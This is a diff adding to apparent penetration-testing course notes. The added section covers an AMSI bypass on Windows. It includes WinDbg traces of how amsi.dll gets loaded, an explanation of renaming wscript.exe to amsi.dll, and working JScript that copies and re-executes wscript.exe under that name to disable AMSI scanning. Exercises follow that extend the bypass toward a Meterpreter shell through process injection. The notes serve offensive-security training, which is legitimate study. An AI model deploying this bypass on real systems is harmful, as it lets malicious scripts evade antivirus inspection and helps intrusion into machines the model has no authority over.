@@ -922,8 +922,9 @@ it was discovered that there isa AMSI enable key. If this key is set to 0 then A
 debugging with windbg 
 
 we need to provide full path of the wscript.exe
+`C:\Windows\System32\wscript.exe`
 and then also provide full path of sleeper.js
-
+`C:\Users\misthios\Documents\pen300\book\chapter7\sleeper.js`
 we find the exact registry key we need to modify
 
 "SOFTWARE\Microsoft\Windows Script\Settings"
@@ -976,6 +977,145 @@ at amsi_bypass.js
 3. Experiment with SharpShooter to generate the same type of payload with an AMSI bypass
 
 sharpshooter doesn't work.
+
+# I am my own executable
+
+Dll search order hijacking attack
+
+debug shellcode runner in Windbg for locating AMSI.DLL
+
+but can we debug non exe files in windbg
+
+```
+lm m amsi
+```
+
+```
+0:000> sxe ld amsi
+0:000> g
+ModLoad: 00007ffe`53c70000 00007ffe`53ca1000   C:\Windows\System32\IMM32.DLL
+ModLoad: 00007ffe`50380000 00007ffe`50398000   C:\Windows\SYSTEM32\kernel.appcore.dll
+ModLoad: 00007ffe`51b80000 00007ffe`51bff000   C:\Windows\System32\bcryptPrimitives.dll
+ModLoad: 00007ffe`4e9f0000 00007ffe`4ea9c000   C:\Windows\system32\uxtheme.dll
+ModLoad: 00007ffe`510f0000 00007ffe`51192000   C:\Windows\SYSTEM32\sxs.dll
+ModLoad: 00007ffe`535d0000 00007ffe`536ee000   C:\Windows\System32\MSCTF.dll
+ModLoad: 00007ffe`53cb0000 00007ffe`53d5f000   C:\Windows\System32\clbcatq.dll
+ModLoad: 00007ffe`3aff0000 00007ffe`3b0c5000   C:\Windows\System32\jscript.dll
+ModLoad: 00007ffe`53570000 00007ffe`535cd000   C:\Windows\System32\SHLWAPI.dll
+ModLoad: 00007ffe`48c70000 00007ffe`48f23000   C:\Windows\System32\iertutil.dll
+ModLoad: 00007ffe`3fe60000 00007ffe`3fe85000   C:\Windows\SYSTEM32\amsi.dll
+ntdll!NtMapViewOfSection+0x14:
+00007ffe`53e44414 c3              ret
+0:000> lm m amsi
+Browse full module list
+start             end                 module name
+00007ffe`3fe60000 00007ffe`3fe85000   amsi       (deferred)             
+0:000> k
+ # Child-SP          RetAddr               Call Site
+00 000000b7`c9bfd248 00007ffe`53dece35     ntdll!NtMapViewOfSection+0x14
+01 000000b7`c9bfd250 00007ffe`53decfcc     ntdll!LdrpMinimalMapModule+0x12d
+02 000000b7`c9bfd310 00007ffe`53df01d8     ntdll!LdrpMapDllWithSectionHandle+0x18
+03 000000b7`c9bfd370 00007ffe`53df1c74     ntdll!LdrpMapDllNtFileName+0x194
+04 000000b7`c9bfd480 00007ffe`53df14d1     ntdll!LdrpMapDllSearchPath+0x1d0
+05 000000b7`c9bfd6e0 00007ffe`53ddbd93     ntdll!LdrpProcessWork+0x151
+06 000000b7`c9bfd730 00007ffe`53de516c     ntdll!LdrpLoadDllInternal+0x1a3
+07 000000b7`c9bfd7d0 00007ffe`53ddb1b6     ntdll!LdrpLoadDll+0xb0
+08 000000b7`c9bfd990 00007ffe`51713ec2     ntdll!LdrLoadDll+0x106
+09 000000b7`c9bfda80 00007ffe`3aff567d     KERNELBASE!LoadLibraryExW+0x172
+0a 000000b7`c9bfdaf0 00007ffe`3aff57bc     jscript!COleScript::Initialize+0x2d
+0b 000000b7`c9bfdb20 00007ffe`53838b6d     jscript!CJScriptClassFactory::CreateInstance+0x5c
+0c 000000b7`c9bfdb50 00007ffe`5382ad2f     combase!CServerContextActivator::CreateInstance+0x1fd [onecore\com\combase\objact\actvator.cxx @ 874] 
+0d 000000b7`c9bfdcd0 00007ffe`53837d4c     combase!ActivationPropertiesIn::DelegateCreateInstance+0x8f [onecore\com\combase\actprops\actprops.cxx @ 1960] 
+0e 000000b7`c9bfdd60 00007ffe`538975e8     combase!CApartmentActivator::CreateInstance+0xcc [onecore\com\combase\objact\actvator.cxx @ 2178] 
+0f 000000b7`c9bfde10 00007ffe`5389d72c     combase!CProcessActivator::CCICallback+0x68 [onecore\com\combase\objact\actvator.cxx @ 1617] 
+10 000000b7`c9bfde60 00007ffe`53893a1e     combase!CProcessActivator::AttemptActivation+0x4c [onecore\com\combase\objact\actvator.cxx @ 1504] 
+11 000000b7`c9bfdeb0 00007ffe`53838944     combase!CProcessActivator::ActivateByContext+0x9e [onecore\com\combase\objact\actvator.cxx @ 1348] 
+12 000000b7`c9bfdf40 00007ffe`5382ad2f     combase!CProcessActivator::CreateInstance+0x94 [onecore\com\combase\objact\actvator.cxx @ 1248] 
+13 000000b7`c9bfdf90 00007ffe`5383a204     combase!ActivationPropertiesIn::DelegateCreateInstance+0x8f [onecore\com\combase\actprops\actprops.cxx @ 1960] 
+14 000000b7`c9bfe020 00007ffe`5382ad2f     combase!CClientContextActivator::CreateInstance+0x124 [onecore\com\combase\objact\actvator.cxx @ 558] 
+15 000000b7`c9bfe0c0 00007ffe`5382df66     combase!ActivationPropertiesIn::DelegateCreateInstance+0x8f [onecore\com\combase\actprops\actprops.cxx @ 1960] 
+16 000000b7`c9bfe150 00007ffe`5382d528     combase!ICoCreateInstanceEx+0x8a6 [onecore\com\combase\objact\objact.cxx @ 1938] 
+17 000000b7`c9bfedf0 00007ffe`5382d28c     combase!CComActivator::DoCreateInstance+0x248 [onecore\com\combase\objact\immact.hxx @ 405] 
+18 (Inline Function) --------`--------     combase!CoCreateInstanceEx+0xd1 [onecore\com\combase\objact\actapi.cxx @ 320] 
+19 000000b7`c9bfef30 00007ff7`d2c5b887     combase!CoCreateInstance+0x10c [onecore\com\combase\objact\actapi.cxx @ 264] 
+1a 000000b7`c9bfefd0 00007ff7`d2c55a64     wscript!CScriptingEngine::Create+0x16b
+1b 000000b7`c9bff060 00007ff7`d2c5569d     wscript!CHost::GetEngineFromName+0xa4
+1c 000000b7`c9bff2b0 00007ff7`d2c5720d     wscript!CHost::Execute+0x159
+1d 000000b7`c9bff5b0 00007ff7`d2c55131     wscript!CHost::Main+0x619
+1e 000000b7`c9bffab0 00007ff7`d2c534b0     wscript!WinMain+0x269
+1f 000000b7`c9bffe20 00007ffe`52b654e0     wscript!WinMainCRTStartup+0x60
+20 000000b7`c9bffec0 00007ffe`53da485b     KERNEL32!BaseThreadInitThunk+0x10
+21 000000b7`c9bffef0 00000000`00000000     ntdll!RtlUserThreadStart+0x2b
+```
+
+We can unassemble the function in the callstack to inspect the arguments supplied to 
+LoadLibraryExW:
+
+```
+0:000> u jscript!COleScript::Initialize LA
+jscript!COleScript::Initialize:
+00007ffe`3aff5650 48895c2418      mov     qword ptr [rsp+18h],rbx
+00007ffe`3aff5655 4889742420      mov     qword ptr [rsp+20h],rsi
+00007ffe`3aff565a 48894c2408      mov     qword ptr [rsp+8],rcx
+00007ffe`3aff565f 57              push    rdi
+00007ffe`3aff5660 4883ec20        sub     rsp,20h
+00007ffe`3aff5664 488bf9          mov     rdi,rcx
+00007ffe`3aff5667 33d2            xor     edx,edx
+00007ffe`3aff5669 41b800080000    mov     r8d,800h
+00007ffe`3aff566f 488d0dc22d0a00  lea     rcx,[jscript!`string' (00007ffe`3b098438)]
+00007ffe`3aff5676 48ff15ab120a00  call    qword ptr [jscript!_imp_LoadLibraryExW (00007ffe`3b096928)]
+0:000> du 00007ffe`3b098438
+00007ffe`3b098438  "amsi.dll"
+```
+
+However, LoadLibraryExW can accept additional arguments and the third argument modifies the 
+function’s default behavior. In this case, R8 (the third argument) is set to 0x800 (as highlighted in 
+Listing 327). This is equivalent to the enum LOAD_LIBRARY_SEARCH_SYSTEM32, which forces 
+the function to search in the C:\Windows\System32 directory first.
+This prevents a DLL hijacking attack. Security researcher James Forshaw discovered an 
+interesting way around this.414 Instead of trying to hijack the DLL loading, James suggests 
+renaming wscript.exe to amsi.dll and executing it.
+There are two important things to note about this approach. First, if a process named “amsi.dll” 
+tries to load a DLL of the same name, LoadLibraryExW will report that it’s already in memory and 
+abort the load to improve efficiency. Obviously, any subsequent attempts to use the AMSI APIs 
+will fail, causing AMSI itself to fail and be disabled, leaving us with an AMSI bypass
+
+The second important thing to note is that double-clicking or running a file with a .dll extension 
+will fail since DLLs are normally loaded, not executed. This behavior is actually caused by the 
+Win32 ShellExecute415 API, which is used by cmd.exe.
+However, if we instead use the CreateProcess416 Win32 API, the file extension is ignored and the 
+file header would be parsed to determine if it is a valid executable. We cannot directly call this API, 
+but we can use the Exec417 method of the WScript.Shell object since it’s just a wrapper for it.
+Implementing this AMSI bypass requires a few new actions. When the Jscript is executed, it will 
+copy wscript.exe to a writable and executable folder, naming it “amsi.dll”. Then, it will execute this 
+copy while supplying the original Jscript file as in the previous bypass.
+We check for the existence of AMSI.dll with try and catch statements to determine if the Jscript 
+file is being executed for the first or the second time
+
+```ps1
+var filesys= new ActiveXObject("Scripting.FileSystemObject");
+var sh = new ActiveXObject('WScript.Shell');
+try
+{
+ if(filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll")==0)
+ {
+ throw new Error(1, '');
+ }
+}
+catch(e)
+{
+ filesys.CopyFile("C:\\Windows\\System32\\wscript.exe", 
+"C:\\Windows\\Tasks\\AMSI.dll");
+ sh.Exec("C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} 
+"+WScript.ScriptFullName);
+ WScript.Quit(1);
+}
+```
+
+### 7.6.3.1 Exercises
+1. Recreate the AMSI bypass by renaming wscript.exe to “amsi.dll” and executing it.
+2. Instead of a regular shellcode runner, implement this bypass with a process injection or 
+hollowing technique and obtain a Meterpreter shell that stays alive after the detection
 
 
 
